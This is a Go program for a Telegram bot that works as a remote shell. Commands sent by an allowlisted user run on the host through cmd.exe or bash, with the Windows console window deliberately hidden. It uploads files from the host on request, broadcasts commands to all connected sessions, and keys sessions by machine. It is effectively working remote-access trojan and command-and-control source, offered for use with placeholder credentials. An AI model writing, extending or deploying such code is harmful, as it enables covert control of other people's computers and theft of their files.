//Hardcoded Credentials are at the bottom of the program
package main
import (
	
	"math/rand"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"sync"
	"syscall"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/google/uuid"
)
type Config struct {
	BotToken     string   `json:"bot_token"`
	AdminIDs     []int64  `json:"admin_ids"`
	MaxFileSize  int64    `json:"max_file_size"`
	SessionToken string   `json:"session_token"`
}
type ShellSession struct {
	ID         string
	CurrentDir string
	UserID     int64
	LastActive time.Time
}
type TelegramShell struct {
	bot         *tgbotapi.BotAPI
	config      Config
	sessions    map[int64]*ShellSession
	sessionLock sync.RWMutex
}

var defaultBlocked = []string{
	"format", "rm -rf", "rm /", "del /f /s", "shutdown",
	"restart", "regedit", "net user", "net localgroup",
}
func main() {
	fmt.Println("=== Telegram Windows Shell ===")
	rand.Seed(time.Now().UnixNano())
	
	// Load config
	config, err := loadConfig()
	if err != nil {
		log.Fatal("Failed to load config:", err)
	}
	
	shell, err := NewTelegramShell(config)
	if err != nil {
		log.Fatal("Failed to initialize shell:", err)
	}
	
	fmt.Println("Bot started.")
	shell.Run()
}


func NewTelegramShell(config Config) (*TelegramShell, error) {
	bot, err := tgbotapi.NewBotAPI(config.BotToken)
	if err != nil {
		return nil, err
	}
	
	shell := &TelegramShell{
		bot:      bot,
		config:   config,
		sessions: make(map[int64]*ShellSession),
	}
	
	return shell, nil
}


func (ts *TelegramShell) Run() {
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60
	
	updates := ts.bot.GetUpdatesChan(u)
	
	for update := range updates {
		if update.Message == nil {
			continue
		}
		
		go ts.handleMessage(update.Message)
	}
}


func (ts *TelegramShell) handleMessage(msg *tgbotapi.Message) {
	userID := msg.From.ID
	if !ts.isAuthorized(userID) {
		if msg.Text == "/start" {
			ts.sendMessage(userID, " Unauthorized access.")
		}
		return
	}
	
	
	ts.ensureSession(userID)
	
	
	ts.sessionLock.Lock()
	if session, exists := ts.sessions[userID]; exists {
		session.LastActive = time.Now()
	}
	ts.sessionLock.Unlock()
	
	
	if msg.IsCommand() {
		ts.handleCommand(msg)
		return
	}
	if strings.Contains(msg.Text, ":") {
    parts := strings.SplitN(msg.Text, ":", 2)
    targetSession := strings.TrimSpace(parts[0])  // "ABC123"
    command := strings.TrimSpace(parts[1])        // "dir"
    
    if targetSession == "" || command == "" {
        return
    }
    
    ts.sessionLock.RLock()
    mySessionID := ts.sessions[userID].ID
    ts.sessionLock.RUnlock()
    
    
    if strings.HasPrefix(mySessionID, targetSession) {
        ts.executeCommand(userID, command)
    }
    
} else {
    
    return
}	
}

func (ts *TelegramShell) handleCommand(msg *tgbotapi.Message) {
	userID := msg.From.ID
	cmd := msg.Command()
	args := msg.CommandArguments()
	

	if strings.Contains(args, ":") {
		parts := strings.SplitN(args, ":", 2)
		sessionPrefix := strings.TrimSpace(parts[0])
		actualArgs := strings.TrimSpace(parts[1])
		
		if sessionPrefix == "" || actualArgs == "" {
			ts.sendMessage(userID, " Invalid format. Use: /cd SESSIONID:Directory")
			return
		}
		

		ts.sessionLock.RLock()
		mySession := ts.sessions[userID]
		ts.sessionLock.RUnlock()
		
		if mySession == nil {
			ts.sendMessage(userID, " Session not found. Send /start.")
			return
		}
		

		if !strings.HasPrefix(mySession.ID, sessionPrefix) {
			// Command meant for another machine, ignore
			return
		}
		

		switch cmd {
		case "cd":
			ts.changeDirectory(userID, actualArgs)
		case "ls", "dir":
			ts.listDirectory(userID, actualArgs)
		case "pwd":
			ts.sendCurrentDir(userID)
		default:
			ts.sendMessage(userID, " Command not supported with session prefix")
		}
		return
	}
	

	ts.sessionLock.RLock()
	session := ts.sessions[userID]
	ts.sessionLock.RUnlock()
	
	if session == nil {
		ts.sendMessage(userID, " Session not found. Send /start.")
		return
	}
	
	switch cmd {
	case "start":
		ts.sendWelcome(userID)
	case "pwd":
		ts.sendCurrentDir(userID)
	case "ls", "dir":
		ts.listDirectory(userID, args)
	case "cd":
		ts.changeDirectory(userID, args)
	case "mysession":
		shortID := session.ID[:8]
		ts.sendMessage(userID, "📱 Your session ID: `"+shortID+"`\n\n"+
			"Use it like:\n"+
			"• `/cd "+shortID+":..`\n"+
			"• `/pwd "+shortID+":`\n"+
			"• `/ls "+shortID+":/path`")
	case "download":
		if args == "" {
			ts.sendMessage(userID, "Usage: /download <filename>")
			return
		}
		
		ts.sessionLock.RLock()
		session := ts.sessions[userID]
		ts.sessionLock.RUnlock()
		
		filePath := filepath.Join(session.CurrentDir, args)
		file, err := os.Open(filePath)
		if err != nil {
			ts.sendMessage(userID, "❌ File not found: "+err.Error())
			return
		}
		defer file.Close()
		
		doc := tgbotapi.NewDocument(userID, tgbotapi.FileReader{
			Name:   filepath.Base(filePath),
			Reader: file,
		})
		ts.bot.Send(doc)
	case "all":	
		if args == "" {
			ts.sendMessage(userID, "Usage: /all <command>")
			return
		}
		
		time.Sleep(time.Duration(rand.Intn(3000)) * time.Millisecond)
		
		hostname, _ := os.Hostname()
		output, _ := ts.runShellCommand(args, session.CurrentDir)
		response := fmt.Sprintf("[%s]:\n%s", hostname, output)
		ts.sendMessage(userID, response)
	default:
		ts.sendMessage(userID, "Unknown command. Send /start for help.")
	}
}

func (ts *TelegramShell) executeCommand(userID int64, cmd string) {
	
	
	
	ts.sessionLock.RLock()
	session, exists := ts.sessions[userID]
	ts.sessionLock.RUnlock()
	
	if !exists {
		ts.sendMessage(userID, "❌ Session expired. Send /start.")
		return
	}
	
	output, err := ts.runShellCommand(cmd, session.CurrentDir)
	if err != nil {
		output = fmt.Sprintf("Error: %v\n%s", err, output)
	}
	
	ts.sendMessage(userID, "```\n"+output+"\n```")
}

// runShellCommand executes a shell command
func (ts *TelegramShell) runShellCommand(cmd, workingDir string) (string, error) {
	var command *exec.Cmd
	
	if runtime.GOOS == "windows" {
		// For Windows, use cmd.exe with hidden window
		command = exec.Command("cmd.exe", "/c", cmd)
		command.Dir = workingDir
		
		// Hide the command window
		if command.SysProcAttr == nil {
			command.SysProcAttr = &syscall.SysProcAttr{}
		}
		command.SysProcAttr.CreationFlags = 0x08000000 // CREATE_NO_WINDOW
		
	} else {
		// Linux/Mac
		command = exec.Command("/bin/bash", "-c", cmd)
		command.Dir = workingDir
	}
	
	output, err := command.CombinedOutput()
	result := string(output)
	
	// Limit output length
	if len(result) > 4000 {
		result = result[:4000] + "\n... (truncated)"
	}
	
	return result, err
}

// sendMessage sends a message to a user
func (ts *TelegramShell) sendMessage(userID int64, text string) {
	msg := tgbotapi.NewMessage(userID, text)
	msg.ParseMode = "Markdown"
	ts.bot.Send(msg)
}

// sendWelcome sends welcome message
func (ts *TelegramShell) sendWelcome(userID int64) {
	welcome := `🖥️ *Windows Shell via Telegram*

*Commands:*
/start - Show this help
/pwd - Show current directory
/ls [path] - List directory
/cd <path> - Change directory
/mysession - Lists your session id
/all - sends command to all active sessions

*Usage:*
Send shell commands directly!

`

	ts.sendMessage(userID, welcome)
}


func (ts *TelegramShell) sendCurrentDir(userID int64) {
	ts.sessionLock.RLock()
	session := ts.sessions[userID]
	ts.sessionLock.RUnlock()
	
	ts.sendMessage(userID, "📁 `"+session.CurrentDir+"`")
}

func (ts *TelegramShell) listDirectory(userID int64, path string) {
	ts.sessionLock.RLock()
	session := ts.sessions[userID]
	ts.sessionLock.RUnlock()
	
	targetDir := session.CurrentDir
	if path != "" {
		if filepath.IsAbs(path) {
			targetDir = path
		} else {
			targetDir = filepath.Join(session.CurrentDir, path)
		}
	}
	
	files, err := os.ReadDir(targetDir)
	if err != nil {
		ts.sendMessage(userID, " Error: "+err.Error())
		return
	}
	
	var result strings.Builder
	result.WriteString("📁 " + targetDir + "\n\n")
	
	for _, file := range files {
		if file.IsDir() {
			result.WriteString("📁 " + file.Name() + "\n")
		} else {
			result.WriteString("📄 " + file.Name() + "\n")
		}
	}
	
	ts.sendMessage(userID, result.String())
}


func (ts *TelegramShell) changeDirectory(userID int64, path string) {
	ts.sessionLock.Lock()
	defer ts.sessionLock.Unlock()
	
	session := ts.sessions[userID]
	
	var newDir string
	if path == "" {
		home, _ := os.UserHomeDir()
		newDir = home
	} else if path == ".." {
		newDir = filepath.Dir(session.CurrentDir)
	} else if path == "." {
		newDir = session.CurrentDir
	} else if filepath.IsAbs(path) {
		newDir = path
	} else {
		newDir = filepath.Join(session.CurrentDir, path)
	}
	
	newDir = filepath.Clean(newDir)
	
	if info, err := os.Stat(newDir); err != nil || !info.IsDir() {
		ts.sendMessage(userID, "❌ Directory not found: "+newDir)
		return
	}
	
	session.CurrentDir = newDir
	ts.sendMessage(userID, "✅ Changed to: `"+newDir+"`")
}


func (ts *TelegramShell) ensureSession(userID int64) {
	ts.sessionLock.Lock()
	defer ts.sessionLock.Unlock()
	
	if _, exists := ts.sessions[userID]; !exists {
		
		home, _ := os.UserHomeDir()
		if home == "" {
			home = "C:\\"
		}
		
		ts.sessions[userID] = &ShellSession{
			ID:         uuid.New().String(),
			CurrentDir: home,
			UserID:     userID,
			LastActive: time.Now(),
		}
	}
}


func (ts *TelegramShell) isAuthorized(userID int64) bool {
	for _, id := range ts.config.AdminIDs {
		if id == userID {
			return true
		}
	}
	return false
}


func loadConfig() (Config, error) {
	// Hardcoded configuration - CHANGE THESE VALUES
	token := "INSERT_BOT_TOKEN"    // ← Change to your bot token
	userID := int64(9999999)        // ← Change to your Telegram user ID
	
	config := Config{
		BotToken:     token,
		AdminIDs:     []int64{userID},
		MaxFileSize:  50 * 1024 * 1024, // 50MB
		SessionToken: uuid.New().String(),
	}	
	return config, nil
}